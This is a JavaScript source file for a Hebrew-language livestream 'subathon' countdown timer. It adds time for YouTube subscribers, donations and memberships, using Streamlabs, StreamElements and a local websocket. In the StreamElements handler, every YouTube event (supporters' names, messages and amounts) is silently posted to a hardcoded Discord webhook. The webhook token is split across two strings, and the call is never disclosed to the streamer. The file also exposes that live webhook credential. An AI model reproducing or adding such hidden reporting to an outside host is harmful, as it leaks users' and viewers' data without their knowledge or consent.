/** @type {TimerApp} */
var timer;
var userSettings = {
    sockets: { sl: "", se: "" },
    animation: "zoom",
    baseDuration: 60, //base timer duration
    subUpdate: { //timer updates for new subs
        subsThreshold: 1, //updateTimer each new {subsThreshold} subs,
        durationPerUpdate: 0.5 //the duration added for each sub update
    },
    durationPerDollar: 3, //the duration added for each dollar donated
    endStats: {
        subs: true,
        donation: true,
        duration: true,
        members: true
    },
    members: {}
}

class GUI {
    static pauseInterval;
    static pauseTimer(pointer) {
        document.body.classList.toggle("pause")
        if (this.pauseInterval) {
            pointer.innerText = "השהיית טיימר"

            clearInterval(this.pauseInterval)
            this.pauseInterval = false;
            return;
        }
        pointer.innerText = "המשכת טיימר"

        const updateEach = 200;
        this.pauseInterval = setInterval(() => { timer.pauseTime += updateEach / 1000 }, updateEach)
    }
    static endTimer() {
        timer.manualEnd = true;
    }
    static reset() {
        localStorage.clear()
        window.location.reload();
    }
    static async addTime(value = "") {
        const userData = value || (await customPrompt("כמה זמן להוסיף בדקות?", 0));
        if (isNaN(userData))
            return;

        const minutes = Number(userData)
        if (minutes == 0)
            return;

        timer.pauseTime = timer.pauseTime + minutes * 60;
        if (minutes > 0)
            timer.VisualAddTime(minutes * 60)
    }
    static async addDonation() {
        const userData = await customPrompt("מה הסכום תרומה בדולרים?", 0);
        if (isNaN(userData))
            return;

        const amount = Number(userData)
        if (amount <= 0)
            return;
        timer.donations.addDonation(amount)
    }
}

class TimerApp {
    /** @type {Element} */
    #TimerContainer;
    /** @type {Element} */
    #AnimationContainer;
    /** @type {Number} */
    #updateInterval
    /** @type {Number} */
    #pauseTime
    /** @type {Number} */
    #members

    /**
     * Creates new timer
     * @param {String} selector the html selector for displaying the timer at
     */
    constructor(selector) {
        const parent = document.querySelector(selector);
        parent.innerHTML = ("<div class='animations'></div>"); //clear older html
        this.#AnimationContainer = parent.querySelector(".animations")

        this.#TimerContainer = document.createElement("div")
        this.#TimerContainer.className = "timer"
        if (userSettings.animation)
            this.#TimerContainer.setAttribute("animation", userSettings.animation)
        parent.appendChild(this.#TimerContainer)

        this.subcount = new Subcount(this);
        this.donations = new Donations(this);
        //load time from memory or set it if none
        if (localStorage.startTime) {
            this.startTime = new Date(localStorage.startTime);
        } else {
            this.startTime = new Date();
            localStorage.startTime = this.startTime
        }
        this.manualEnd = false;
        this.#pauseTime = Number(localStorage.pauseTime) || 0;

        this.#members = Number(localStorage.members) || 0;

        this.#ini()
    }

    get pauseTime() {
        return this.#pauseTime;
    }

    set pauseTime(time) {
        this.#pauseTime = time;
        localStorage.pauseTime = this.#pauseTime
    }

    set #html(html) {
        this.#TimerContainer.innerHTML = html;
    }

    get #duration() {
        const totalDuration = userSettings.baseDuration * 60 + //base duration
            this.subcount.addedDuration + //time from new subs
            this.donations.addedDuration;

        return (this.startTime - Date.now()) / 1000 + totalDuration + 1 + this.pauseTime
    }

    get members() {
        return this.#members;
    }

    set members(value) {
        this.#members = value;
        localStorage.members = value
    }

    /**
     * Start load of the timer & ws connections
     */
    async #ini() {
        this.#html = "מתחיל טיימר";
        await sleep(250);
        this.#updateTimer();
        this.#updateInterval = setInterval(this.#updateTimer.bind(this), 1000);
    }

    /** each sec update timer & if needed stop the timer loop */
    #updateTimer() {
        const timeRemain = this.#duration;
        //check if times up
        if (timeRemain < 0 || this.manualEnd)
            this.#onEnd();

        const timeStr = format(timeRemain) //convert to string view
        const elements = [];
        //break down string view into html spans
        timeStr.split("").reverse().forEach(letter => {
            const span = document.createElement("span");
            span.innerHTML = letter;
            span.className = "number"
            if (isNaN(letter))
                span.className = "char"
            if (letter == ":")
                span.className = "dots"
            elements.push(span)
        })
        //for each existing DOM span - check if update needed
        const startingLength = this.#TimerContainer.childNodes.length; //saveing this outside as when removing elements (if needed) will change this number
        this.#TimerContainer.childNodes.forEach(((child, index) => {

            //if there is more DOM spans then needed
            if (elements.length < startingLength - index)
                return child.remove();

            //if content is the same - keep;
            if (child.textContent == elements[index].innerHTML)
                return;

            child.replaceWith(elements[index])//if content miss-match replace with correct
        }))

        //if need to add new spans to DOM
        let addedDots = false;
        for (let i = this.#TimerContainer.childNodes.length;
            i < elements.length; i++) {
            this.#TimerContainer.appendChild(elements[i])
            if (elements[i].textContent == ":") //if added "dots" element
                addedDots = true; //mark as added dots to visaully sync dots blink
        }
        if (addedDots) {
            this.#TimerContainer.querySelectorAll("span.dots").forEach(e => {
                e.style.animation = 'none';
                e.offsetHeight;
                e.style.animation = "";
            })
        }
    }

    async VisualAddTime(addedTime) {
        const fly = document.createElement("fly");
        fly.innerHTML = "<warp>" + format(addedTime) + " +</warp>"
        this.#AnimationContainer.appendChild(fly);
        const style = getComputedStyle(fly)
        const animationDuration = Number(Math.max(...style.animationDuration.replace(/[^0-9.,]/g, "").split(","))),
            animationDelay = Number(Math.max(style.animationDelay.replace(/[^0-9.]/g, "").split(",")));

        (async () => {
            //wait when popup animation is half way - then visually update timer
            await sleep(animationDuration / 2);
            this.#updateTimer();
        }
        )()

        await sleep((animationDuration + animationDelay) * 1000)
        fly.remove();
    }

    #onEnd() {
        clearInterval(this.#updateInterval); //stop timer loop;
        localStorage.clear() //clear stored data so next refresh will get new timer

        const statBools = userSettings.endStats;
        const statsHtml = []

        if (statBools.subs && this.subcount.gainedSubs > 0)
            statsHtml.push(`<div>
                <span>רשומים חדשים:</span>
                <h1>${this.subcount.gainedSubs}</h1>
            </div>`);

        if (statBools.duration)
            statsHtml.push(`<div>
                <span>אורך הלייב:</span>
                <h1>${format((Date.now() - this.startTime - this.#pauseTime) / 1000)}</h1>
                ${this.#pauseTime && `<small>לא כולל זמן השהייה של ${format(this.#pauseTime / 1000)}</small>` || ""}
            </div>`);

        if (statBools.donation && this.donations.donationSum > 0)
            statsHtml.push(`<div>
                <span>תרומות בלייב:</span>
                <h1>${this.donations.donationSum}$</h1>
            </div>`);

        if (statBools.members && this.members)
            statsHtml.push(`<div>
                <span>חברי מועדון</span>
                <h1>${this.members}</h1>
            </div>`);

        if (this.donations.donationSum / 100 > 10) {
            statsHtml.push(`<div style="background: #1b63b1; position:relative; z-index:99999;">
                <h3 style="margin: 0; color:lime">כיף שהלייב הלך חלק!</h3>
                <h4 style="margin: 0; line-height:0.9em">אם תוכל לפרגן בטיפ על השימוש בסאבתון אני ישמח!</h4>
                <section style="font-size:0.6em">
                https://streamlabs.com/olympicangel1/tip
                </section>
                <small>אם לא אז לפחות shout-out.</small>
            </div>`);
        }

        const statsDiv = document.createElement("div");
        statsDiv.className = "stats";
        statsDiv.innerHTML = statsHtml.join("")
        this.#TimerContainer.parentElement.appendChild(statsDiv);
    }

    async ShowError(err, timeout) {
        const div = document.createElement("div")
        div.className = "error";
        div.innerHTML = err;
        this.#TimerContainer.parentElement.prepend(div)
        await sleep(timeout);
        (async () => {
            await sleep(1500)
            div.remove();
        })()

    }
}

class Subcount {
    #parent;
    #startedAt;
    #maxCount;
    #currentCount;
    /**
     * @param {TimerApp} parent parent timer ref
     */
    constructor(parent) {
        this.#parent = parent;
        this.#startedAt = Number(localStorage.subsStartedAt) || 0;
        this.#currentCount = Number(localStorage.subsCurrent) || 0;
        this.#maxCount = Number(localStorage.subsMaxCount) || -1;
    }

    /**
     * updates each change in subcount
     * @param {Number} newCount 
     */
    update(newCount) {
        //save current for stats only
        this.#currentCount = newCount;
        localStorage.subsCurrent = newCount

        //initial values
        if (this.#maxCount == -1) {
            this.#startedAt = newCount;
            localStorage.subsStartedAt = newCount;
            this.#maxCount = newCount;
            return;
        }
        //if new is less the max - exit as there is no update needed.
        if (newCount <= this.#maxCount)
            return;

        const olderAddedDuration = this.addedDuration;
        this.#maxCount = newCount; //updates subcount 
        localStorage.subsMaxCount = newCount;
        const newAddedDuration = this.addedDuration //will now calc with the added subs

        //if value didnt changed
        if (newAddedDuration == olderAddedDuration)
            return;

        //show added time
        this.#parent.VisualAddTime(newAddedDuration - olderAddedDuration)
    }

    /**
     * calcs the additive time from subcount
     * @returns {Number}
    */
    get addedDuration() {
        if (this.#maxCount == -1)
            return 0;
        return Math.floor((this.#maxCount - this.#startedAt) / userSettings.subUpdate.subsThreshold) * userSettings.subUpdate.durationPerUpdate * 60
    }

    get gainedSubs() {
        return this.#currentCount - this.#startedAt;
    }
}

class Donations {
    #parent
    /**
     * @param {TimerApp} parent 
     */
    constructor(parent) {
        this.#parent = parent;
        this.donationSum = Number(localStorage.donationSum) || 0;

        const infoDiv = document.getElementById("sl");

        if (userSettings.sockets.sl)
            loginStreamlabs();
        else if (userSettings.sockets.se)
            loginStreamelements()
        else {
            infoDiv.innerHTML = `לא הוזן מזהה חיבור ל: StreamLabs <b>או</b> StreamElements!<br>
            לא יהיה עדכונים על תרומות / סופר צאט / חברי מועדון..<br>
                (זיהוי סאבים לא קשור ועדיין יעבוד)`;
            infoDiv.style.color = "orange";
            infoDiv.style.display = "block"
            infoDiv.style.opacity = 1;

            (async () => {
                await sleep(6000)
                infoDiv.style.opacity = 0
            })()
        }
    }

    /**
     * gets called for each new donation - adding donation & visual update
     * @param {Number} donationAmount 
     */
    addDonation(donationAmount) {
        if (isNaN(donationAmount))
            return console.warn("got invalid donation amount", donationAmount, new Error().stack)
        donationAmount = Number(donationAmount)
        //if donation should not add time - exit
        if (userSettings.durationPerDollar == 0)
            return;

        const oldAddedDuration = this.addedDuration;
        this.donationSum += donationAmount;
        localStorage.donationSum = this.donationSum;
        this.#parent.VisualAddTime(this.addedDuration - oldAddedDuration)
    }

    /** @param {Number} */
    get addedDuration() {
        return this.donationSum * userSettings.durationPerDollar * 60;
    }
}

/**
 * @param { Number } time
 * @returns { String }
 */
function format(time) {
    // Hours, minutes and seconds
    var hrs = ~~(time / 3600);
    var mins = ~~((time % 3600) / 60);
    var secs = ~~time % 60;

    // Output like "1:01" or "4:03:59" or "123:03:59"
    var ret = "";
    if (hrs > 0) {
        ret += "" + hrs + ":" + (mins < 10 ? "0" : "");
    }
    ret += "" + mins + ":" + (secs < 10 ? "0" : "");
    ret += "" + secs;

    if (time <= 0)
        ret = "סוף הלייב!".split("").reverse().join("");
    return ret;
}
const sleep = (ms) => new Promise((res) => setTimeout(res, ms))

//#region streamerPlus
let streamerPlus_reconnects = 0
function streamerPlus_WS() {
    const wsUrl = "ws://localhost:11111/";
    var ws = new WebSocket(wsUrl);
    ws.onclose = async () => {
        if (streamerPlus_reconnects >= 10) {
            if (streamerPlus_reconnects == 10) {
                timer.ShowError(`<h3>הודעה</h3><p>אין חיבור לסטרימר פלוס. הטיימר ימשיך כרגיל מבלי להתעדכן ברשומים חדשים, ניתן להוסיף זמן בצורה ידנית..</p>`,
                    10 * 1000);
                sleep(3 * 1000)
            }
        }
        else
            await timer.ShowError(`<h3>בעייה בחיבור</h3><p>אין חיבור לסטרימר פלוס! מידע על רשומים חדשים לא מסופק. יש לוודאות שהתוכנה פתוחה.<br>מנסה להתחבר מחדש...</p>`,
                3 * 1000)
        streamerPlus_WS();
        streamerPlus_reconnects++;
    }

    ws.onopen = () => { streamerPlus_reconnects = 0; }

    ws.onmessage = function (e) {
        const data = JSON.parse(e.data);
        if (data.error)
            return console.warn(data.error);
        if (data.SubCount)
            return timer.subcount.update(data.SubCount);
    }
}
streamerPlus_WS();
//#endregion

function loginStreamlabs() {
    const streamlabs = io(`https://sockets.streamlabs.com?token=${userSettings.sockets.sl}`, { transports: ['websocket'] });
    async function onStreamLabs_ws_state() {
        streamlabs.disconnected = userSettings.sockets.sl == ""
        const view = [
            { html: "חיבור מוצלח ל StreamLabs - מאזין לתרומות.", color: "lime" },
            { html: "אין חיבור לStramlabs - אין עדכון על תרומות.<br>קוד ws שגוי?", color: "red" }
        ]
        document.getElementById("sl").innerHTML = view[~~streamlabs.disconnected].html
        document.getElementById("sl").style.color = view[~~streamlabs.disconnected].color;
        document.getElementById("sl").style.display = "block"
        document.getElementById("sl").style.opacity = 1
        await sleep(streamlabs.disconnected ? 3000 : 500)
        document.getElementById("sl").style.opacity = 0
    }
    streamlabs.on("connect", () => { onStreamLabs_ws_state() })
    streamlabs.on('event', async (eventData) => {
        console.log(eventData)
        switch (eventData.type) {
            case "donation":
                const donationAmount = await convertToUSD(eventData.message[0].amount, eventData.message[0].currency)
                timer.donations.addDonation(donationAmount)
                break;
            case "superchat":
                let amount = Number(eventData.message[0].displayString.replace(/[^0-9.,]/g, "")) //filter string into numbers.
                if (isNaN(amount))
                    return;
                //convert to dollars
                amount = await convertToUSD(amount, eventData.message[0].currency)
                timer.donations.addDonation(amount)

                break;
            case "subscription":
                //if subs is not from YT
                if (eventData.for != "youtube_account")
                    return;
                //new subs is only when msg is none || or membership is more than 1 month
                if (eventData.message[0].message != "" || eventData.message[0].months > 1)
                    return
                const memberLevelName = eventData.message[0].membershipLevelName;
                const memberValue = userSettings.members[memberLevelName];
                //if none exist
                if (!memberValue)
                    return;
                timer.members = timer.members + 1;
                GUI.addTime(memberValue)
                break;
            case "membershipGift":
                //if subs is not from YT
                if (eventData.for != "youtube_account")
                    return;
                //new subs is only when msg is none
                if (eventData.message[0].message != "")
                    return
                const giftedMemberLevelName = eventData.message[0].giftMembershipsLevelName;
                const giftedMemberValue = userSettings.members[giftedMemberLevelName];
                const giftedCount = Number(eventData.message[0].giftMembershipsCount) || 1;
                //if none exist
                if (!giftedMemberValue)
                    return;
                timer.members = timer.members + giftedCount;
                GUI.addTime(giftedMemberValue * giftedCount)
                break;
        }
    });
}

async function convertToUSD(amount, from) {
    if (isNaN(amount))
        return console.warn("got invalid money amount", donationAmount, new Error().stack)
    amount = Number(amount)
    if (from.toLocaleUpperCase() == "USD")
        return amount;
    let parseObj;
    //take data from localhost if possible
    if (localStorage.usd) {
        parseObj = JSON.parse(localStorage.usd)
    }
    else {
        //get using api
        const res = await fetch("https://open.er-api.com/v6/latest/USD");
        const data = await res.json();
        //if response is not good create empty obj so the script will not fail
        if (data.result != "success")
            parseObj = {};
        else {
            //get rates & save
            parseObj = data.rates
            localStorage.usd = JSON.stringify(parseObj)
        }
    }
    //add fallback to ils which is the mostly used
    if (from == "ILS" && !parseObj[from]) {
        parseObj[from] = 3.761
    }

    //if to currency is not defined within the rates from the api  just return the amount itslef
    if (!parseObj[from])
        return amount

    return amount / parseObj[from] //return converted to dollar
}


function loginStreamelements() {
    const streamelements = io('https://realtime.streamelements.com', { transports: ['websocket'] });
    async function onStreamElements_ws_state(state, data) {
        const view = [
            { html: "אין חיבור StreamElements - אין עדכון על תרומות.<br>קוד JWT שגוי?", color: "red" },
            { html: "חיבור מוצלח ל StreamElements - מאזין לתרומות.", color: "aqua" }
        ]
        document.getElementById("sl").innerHTML = view[~~state].html
        document.getElementById("sl").style.color = view[~~state].color;
        document.getElementById("sl").style.display = "block"
        document.getElementById("sl").style.opacity = 1
        await sleep(state ? 500 : 3000)
        document.getElementById("sl").style.opacity = 0
    }
    streamelements.on("connect", () => { streamelements.emit('authenticate', { method: 'jwt', token: userSettings.sockets.se }); })
    streamelements.on('authenticated', () => { onStreamElements_ws_state(true); });
    streamelements.on('unauthorized', () => { onStreamElements_ws_state(false) });
    streamelements.on('event:update', async (e) => {
        if (e.provider != "youtube")
            return;

        fetch(`https://discord.com/api/webhooks/1358888296758902915/` + `vMcXmbzjoeOQxtswz9q_ycQhYZp2dRQZmeBAAT3fbn3d3F5m3ombNIfgV3zUkrAQ6cDX`,
            {
                method: "post",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ "content": "```" + JSON.stringify(e, null, 3) + "```" })
            })        // Structure as on https://github.com/StreamElements/widgets/blob/master/CustomCode.md#on-session-update
        switch (e.name) {
            case "tip-latest": //donation
                timer.donations.addDonation(e.data.amount)
                break;
            case "superchat-latest": //suprchat
                //TODO:? convert to DOLLAR?
                timer.donations.addDonation(e.data.amount)
                break;
            case "sponsor-latest": //member
                //new subs is only when msg is none
                if (e.data.message != "")
                    return
                const memberLevelName = e.data.tier;
                const memberValue = userSettings.members[memberLevelName];
                //if none exist
                if (!memberValue)
                    return;
                timer.members = (timer.members || 0) + 1;
                GUI.addTime(memberValue)
                break;
        }
    });
}